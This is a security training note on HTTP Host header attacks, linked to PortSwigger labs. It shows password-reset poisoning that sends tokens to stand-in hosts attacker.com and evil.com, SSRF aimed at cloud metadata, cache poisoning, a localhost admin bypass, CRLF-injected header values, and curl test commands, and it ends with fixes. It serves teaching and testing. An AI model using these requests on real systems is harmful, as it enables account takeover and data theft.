---
tags: [vapt, http-headers, web, intermediate]
difficulty: intermediate
module: "03 - HTTP Headers"
topic: "03.01 Host Header"
portswigger_labs: ["HTTP Host header attacks (7 labs)"]
---

# 03.01 — Host Header

## What is it?

The `Host` header tells the server which virtual host (website) to serve, since one IP address can host many domains. It's **mandatory in HTTP/1.1** and carries the domain name and optional port.

**Why it matters for VAPT:** The `Host` header is trusted implicitly by many applications and frameworks. When used in application logic (password reset emails, cache keys, URL generation), it becomes an injection vector for password reset poisoning, SSRF, cache poisoning, and access control bypasses.

---

## How Virtual Hosting Works

```
ONE IP, MULTIPLE WEBSITES:
  IP: 93.184.216.34 hosts:
    - example.com
    - shop.example.com
    - api.example.com

  Without Host header → server doesn't know which site to serve!

  Request 1:
  GET / HTTP/1.1
  Host: example.com       ← "give me example.com's homepage"
  
  Request 2:
  GET / HTTP/1.1
  Host: shop.example.com  ← "give me the shop's homepage"
  
  Same IP, different responses based on Host!

NGINX VIRTUAL HOST CONFIG:
  server {
    listen 80;
    server_name example.com;    ← matches Host: example.com
    root /var/www/example;
  }
  server {
    listen 80;
    server_name shop.example.com;  ← matches Host: shop.example.com
    root /var/www/shop;
  }
```

---

## Attack 1: Password Reset Poisoning

```
VULNERABILITY: Application uses the Host header to generate password reset link.

NORMAL FLOW:
  1. User visits: POST /forgot-password (body: email=alice@test.com)
  2. App generates: https://target.com/reset?token=abc123
  3. App sends email: "Click here to reset: https://target.com/reset?token=abc123"
  4. User clicks → resets password

VULNERABLE CODE (conceptual):
  reset_link = "https://" + request.headers['Host'] + "/reset?token=" + token

ATTACK:
  1. Attacker sends: POST /forgot-password (body: email=victim@test.com)
     Host: attacker.com     ← modified Host header!
  
  2. App generates: https://attacker.com/reset?token=abc123
  
  3. App sends email to victim: "Click here: https://attacker.com/reset?token=abc123"
  
  4. Victim clicks → attacker's server receives the token!
     GET /reset?token=abc123 HTTP/1.1
     Host: attacker.com
  
  5. Attacker uses token → resets victim's password → account takeover!

EXPLOIT:
  In Burp Suite → Intercept forgot-password request → change Host header → Forward
  Set up listener on attacker.com to capture the token
```

**PortSwigger Labs:** "Basic password reset poisoning", "Password reset poisoning via middleware"

---

## Attack 2: Host Header SSRF

```
VULNERABILITY: Application uses Host header to make server-side requests.

Scenario: App has a "preview this URL" feature that uses Host to determine
          which internal service to contact.

ATTACK:
  GET / HTTP/1.1
  Host: internal-admin.corp
  
  If app forwards Host to backend → it requests internal-admin.corp!
  
  More targeted:
  GET / HTTP/1.1
  Host: 169.254.169.254
  
  App might request http://169.254.169.254/ → cloud metadata!
  
  Or via X-Forwarded-Host:
  GET / HTTP/1.1
  Host: target.com
  X-Forwarded-Host: 169.254.169.254
```

---

## Attack 3: Web Cache Poisoning via Host

```
ATTACK:
  If app reflects Host in response AND response is cached:
  
  GET / HTTP/1.1
  Host: attacker.com          ← inject attacker domain

  Response (if vulnerable):
  <link href="https://attacker.com/static/main.js" rel="stylesheet">
  ↑ The Host got reflected into a URL in the response!
  
  If this response gets cached → all subsequent visitors load attacker.com/main.js!
  → Stored XSS via cache poisoning!

TEST:
  Send request with Host: attacker.com
  Check if attacker.com appears anywhere in the response body or headers
  Try to get it cached (repeat requests)
```

---

## Attack 4: Access Control Bypass (Internal Host)

```
Some endpoints are protected by checking if request comes from internal network.
Check is done by matching Host header to internal hostname!

ATTACK:
  Blocked:
  GET /admin HTTP/1.1
  Host: target.com
  → 403 Forbidden

  Bypass:
  GET /admin HTTP/1.1
  Host: localhost
  → 200 OK! (App thinks request came from localhost)

  Other Host values to try:
  Host: 127.0.0.1
  Host: internal.target.com
  Host: admin.target.com
  Host: target.com:8080    ← non-standard port might bypass rules
```

---

## Attack 5: Host Header Injection Variants

```
ADDITIONAL HOST HEADER TRICKS:

1. Duplicate Host header:
   GET / HTTP/1.1
   Host: target.com
   Host: attacker.com   ← which one does the server use?

2. Absolute URI in request line:
   GET https://attacker.com/ HTTP/1.1
   Host: target.com
   ← Which URL does the server use?

3. Port injection:
   Host: target.com:8080@attacker.com
   Host: target.com%0d%0aX-Injected: evil
   Host: attacker.com#target.com
   Host: target.com:evil

4. Fuzz:
   Host: target.com.attacker.com   ← domain confusion
   Host: target.com;host=attacker  ← injection
```

---

## How to Test

```bash
# Basic Host header injection test
curl -H "Host: attacker.com" https://target.com/
# Watch if attacker.com appears in response

# Password reset test
curl -X POST https://target.com/forgot-password \
  -H "Host: evil.com" \
  -d "email=victim@test.com"
# Set up listener on evil.com → capture reset token in server logs

# Admin bypass test
curl -H "Host: localhost" https://target.com/admin
curl -H "Host: 127.0.0.1" https://target.com/admin

# Cache poisoning test (check if reflected)
curl -H "Host: evil.com" https://target.com/ | grep "evil.com"

# Burp Suite:
# 1. Intercept any request
# 2. Change Host header in Inspector or raw view
# 3. Send to Repeater
# 4. Modify and observe response
# 5. Use Param Miner extension to auto-discover unkeyed headers
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| Host header in password reset | Hardcode domain in config, don't use request.host |
| Host used in cache key (incomplete) | Include Host in cache key validation |
| Access control via Host match | Use network-level controls (firewall), not Host header |
| Host reflected in response | Never reflect Host directly; use hardcoded base URL |

---

## Related Notes
- [[02 - X-Forwarded-For]] — proxy IP headers (related bypass)
- [[03 - X-Forwarded-Host]] — similar attack vector
- [[Module 10 - Web Cache Poisoning]] — Host in cache poisoning
- [[Module 13 - SSRF]] — SSRF via Host header
